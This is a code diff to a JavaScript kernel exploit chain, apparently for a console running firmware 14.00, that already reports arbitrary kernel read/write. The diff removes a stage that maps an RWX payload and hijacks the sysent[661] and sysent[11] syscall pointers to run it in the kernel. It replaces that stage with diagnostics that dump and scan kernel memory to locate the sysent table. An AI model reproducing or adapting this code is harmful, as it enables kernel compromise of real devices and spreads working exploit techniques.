@@ -224,15 +224,12 @@ export async function runKevent(c) {
     fin("kbase not provided");
   }
 
-  // ** CRITICAL: force correct 14.00 kbase **
+  // Force correct 14.00 kbase if computed kbase is outside the kernel text range
   const EXPECTED_KBASE = 0xffffffff86880000n;
   log("KEVENT-KBASE-CHECK", "current=" + h16(STATE.kbase) + " expected=" + h16(EXPECTED_KBASE));
-
-  // If the computed kbase is absurd (not in the 0xffffffff80000000-0xffffffff8fffffff range),
-  // override it with the known-correct 14.00 value.
   const kbaseHi = STATE.kbase >> 32n;
   if (kbaseHi !== 0xffffffffn || STATE.kbase > 0xffffffff8fffffffn) {
-    log("KEVENT-KBASE-FIX", "kbase is outside kernel text range, forcing to " + h16(EXPECTED_KBASE));
+    log("KEVENT-KBASE-FIX", "kbase outside kernel text range, forcing to " + h16(EXPECTED_KBASE));
     STATE.kbase = EXPECTED_KBASE;
   }
 
@@ -266,126 +263,72 @@ export async function runKevent(c) {
   STATE.rwReady = true;
   log("STAGE3-RW", "*** ARBITRARY KERNEL R/W ESTABLISHED ***");
 
-  // --- STAGE 4: MAP NEW PAYLOAD + HIJACK ---
-  const payloadParam = c.params.get("payload");
-  const payloadAddr = payloadParam ? BigInt(payloadParam) : 0x2002bc000n;
-  STATE.payloadAddr = payloadAddr;
-  log("STAGE4-PAYLOAD-ADDR", h16(payloadAddr));
+  // --- STAGE 4: DIAGNOSTIC ONLY (safe, no hijack, no panic) ---
+  log("DIAG-KBASE", "kbase = " + h16(STATE.kbase));
 
-  const payloadSize = 0x40000;
-  let mappedAddr = 0n;
-
-  try {
-    const mrf = scn64("mmap", payloadAddr, payloadSize, 7, 0x12, -1, 0);
-    const got = (BigInt(mrf.hi >>> 0) << 32n) | BigInt(mrf.lo >>> 0);
-    if (got === payloadAddr) {
-      mappedAddr = got;
-      log("STAGE4-MAP-FIXED", "mapped RWX at " + h16(got));
-    } else {
-      const m = scn64("mmap", 0, payloadSize, 7, 0x1002, -1, 0);
-      mappedAddr = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
-      log("STAGE4-MAP-FLOAT", "mapped RWX at " + h16(mappedAddr) + " (fixed refused)");
-    }
-  } catch (e) {
-    log("STAGE4-MAP-FAIL", e.message);
-    fin("cannot map payload");
-  }
-
-  if (mappedAddr < 0x10000n) fin("mmap returned invalid address");
-
-  log("STAGE4-WRITE", "writing PKB to " + h16(mappedAddr));
-  const pkbLen = T.PKB.length;
-  let written = 0;
-  for (let i = 0; i + 1 < pkbLen; i += 2) {
-    const hi = parseInt(T.PKB[i], 16);
-    const lo = parseInt(T.PKB[i+1], 16);
-    const byte = (hi << 4) | lo;
-    p.write1(toI64(mappedAddr + BigInt(written)), byte);
-    written++;
-  }
-  log("STAGE4-WRITE-DONE", "wrote " + written + " bytes");
-
-  try {
-    const firstFour = p.read4(toI64(mappedAddr));
-    log("STAGE4-PAYLOAD-CHECK", "first 4 bytes = 0x" + (firstFour >>> 0).toString(16));
-    if (firstFour === 0) {
-      log("STAGE4-ABORT", "payload is all zeros — something went wrong");
-      fin("payload invalid");
-    }
-  } catch (e) {
-    log("STAGE4-PAYLOAD-FAIL", e.message);
-    fin("cannot read payload");
-  }
-
-  // ** 2. Read sysent at 0x1102B70 (14.00 verified offset) **
-  const SYSENT_BASE_1400 = 0x1102B70n;
-  const sysent661Addr = STATE.kbase + SYSENT_BASE_1400 + 661n * 0x30n + 8n;
-  const sysent11Addr = STATE.kbase + SYSENT_BASE_1400 + 11n * 0x30n + 8n;
-
-  log("STAGE4-SYSENT-BASE", h16(STATE.kbase + SYSENT_BASE_1400));
-  log("STAGE4-SYSENT-661-ADDR", h16(sysent661Addr));
-  log("STAGE4-SYSENT-11-ADDR", h16(sysent11Addr));
-
-  let orig661, orig11;
-  try {
-    orig661 = p.read8(toI64(sysent661Addr));
-    orig11 = p.read8(toI64(sysent11Addr));
-    log("STAGE4-ORIG", "sysent[661]=" + h16(orig661) + " sysent[11]=" + h16(orig11));
-
-    if (orig661.hi >>> 0 !== 0xffffffff || orig661.low === 0n) {
-      log("STAGE4-SYSENT-INVALID", "sysent[661] is not a kernel pointer — sysent table not at expected offset");
-      log("STAGE4-SYSENT-DUMP", "raw value=" + h16(orig661));
-      fin("sysent offset wrong for 14.00 — kernel layout mismatch");
-    }
-    log("STAGE4-SYSENT-OK", "sysent[661].sy_call is a valid kernel pointer");
-  } catch (e) {
-    log("STAGE4-READ-FAIL", e.message);
-    fin("failed to read sysent table");
-  }
-
-  // ** 3. Try sysent[661] **
-  log("STAGE4-661-HIJACK", "writing " + h16(mappedAddr) + " to sysent[661].sy_call");
-  p.write8(toI64(sysent661Addr), toI64(mappedAddr));
-
-  const readback661 = p.read8(toI64(sysent661Addr));
-  if (readback661.low !== mappedAddr.low || readback661.hi !== mappedAddr.hi) {
-    log("STAGE4-661-FAIL", "hijack did not land: got=" + readback661 + " want=" + mappedAddr);
-  } else {
-    log("STAGE4-661-VERIFIED", "sysent[661].sy_call now points at " + h16(mappedAddr));
-    log("STAGE4-661-TRIGGER", "calling syscall(661)...");
+  function dumpBytes(addr, n, tag) {
     try {
-      const ret = scn(661);
-      log("STAGE4-661-RETURNED", "ret=" + ret);
-      p.write8(toI64(sysent661Addr), orig661);
-      log("STAGE4-DONE", "payload executed successfully via sysent[661]");
-      fin("Stage 4 Complete.");
-      return;
+      let hex = "";
+      for (let i = 0; i < n; i++) {
+        hex += p.read1(toI64(addr + BigInt(i))).toString(16).padStart(2, "0");
+      }
+      log(tag, "addr=" + h16(addr) + " bytes=" + hex);
     } catch (e) {
-      log("STAGE4-661-THREW", e.message);
-      p.write8(toI64(sysent661Addr), orig661);
+      log(tag, "addr=" + h16(addr) + " ERROR: " + e.message);
     }
   }
 
-  // ** 4. Fallback sysent[11] **
-  log("STAGE4-11-HIJACK", "writing " + h16(mappedAddr) + " to sysent[11].sy_call");
-  p.write8(toI64(sysent11Addr), toI64(mappedAddr));
-
-  const readback11 = p.read8(toI64(sysent11Addr));
-  if (readback11.low !== mappedAddr.low || readback11.hi !== mappedAddr.hi) {
-    log("STAGE4-11-FAIL", "hijack did not land: got=" + readback11);
-    fin("Both 661 and 11 failed.");
-  }
-  log("STAGE4-11-VERIFIED", "sysent[11].sy_call now points at " + h16(mappedAddr));
-
-  log("STAGE4-11-TRIGGER", "calling syscall(11)...");
+  const SYSENT_1400 = 0x1102B70n;
+  dumpBytes(STATE.kbase + SYSENT_1400, 32, "DIAG-SYSENT-1400");
   try {
-    const ret = scn(11);
-    log("STAGE4-11-RETURNED", "ret=" + ret);
+    const narg0 = p.read4(toI64(STATE.kbase + SYSENT_1400));
+    log("DIAG-SYSENT-1400-NARG", "sy_narg[0]=" + narg0 + " (want 0)");
+    const call0 = p.read8(toI64(STATE.kbase + SYSENT_1400 + 8n));
+    log("DIAG-SYSENT-1400-CALL", "sy_call[0]=" + h16(call0));
   } catch (e) {
-    log("STAGE4-11-THREW", e.message);
+    log("DIAG-SYSENT-1400-ERR", e.message);
   }
 
-  p.write8(toI64(sysent11Addr), orig11);
-  log("STAGE4-DONE", "payload execution attempted");
-  fin("Stage 4 Complete.");
+  const SYSENT_1352 = 0x110A760n;
+  dumpBytes(STATE.kbase + SYSENT_1352, 32, "DIAG-SYSENT-1352");
+  try {
+    const narg0 = p.read4(toI64(STATE.kbase + SYSENT_1352));
+    log("DIAG-SYSENT-1352-NARG", "sy_narg[0]=" + narg0 + " (want 0)");
+    const call0 = p.read8(toI64(STATE.kbase + SYSENT_1352 + 8n));
+    log("DIAG-SYSENT-1352-CALL", "sy_call[0]=" + h16(call0));
+  } catch (e) {
+    log("DIAG-SYSENT-1352-ERR", e.message);
+  }
+
+  log("DIAG-SCAN", "scanning kbase+0x800000 to kbase+0x3000000 for sysent");
+  let found = 0;
+  for (let off = 0x800000n; off < 0x3000000n; off += 0x100n) {
+    const addr = STATE.kbase + off;
+    try {
+      const narg0 = p.read4(toI64(addr));
+      if (narg0 !== 0) continue;
+      const call0 = p.read8(toI64(addr + 8n));
+      if (call0.hi >>> 0 !== 0xffffffff || call0.low === 0) continue;
+      const narg11 = p.read4(toI64(addr + 11n * 0x30n));
+      if (narg11 < 0 || narg11 > 8) continue;
+      const call11 = p.read8(toI64(addr + 11n * 0x30n + 8n));
+      if (call11.hi >>> 0 !== 0xffffffff) continue;
+      const narg661 = p.read4(toI64(addr + 661n * 0x30n));
+      const call661 = p.read8(toI64(addr + 661n * 0x30n + 8n));
+      log("DIAG-HIT", "offset=+0x" + off.toString(16) +
+          " narg0=" + narg0 + " call0=" + h16(call0) +
+          " narg11=" + narg11 + " call11=" + h16(call11) +
+          " narg661=" + narg661 + " call661=" + h16(call661));
+      found++;
+      if (found >= 16) break;
+    } catch (e) {}
+  }
+  log("DIAG-SCAN-DONE", "found " + found + " candidates");
+
+  if (found === 0) {
+    log("DIAG-NO-SYSENT", "no sysent table found in range 0x800000-0x3000000");
+    fin("Diagnostic complete: sysent not found.");
+  }
+
+  fin("Diagnostic complete. Paste DIAG-SYSENT-1400, DIAG-SYSENT-1352, and DIAG-HIT lines.");
 }
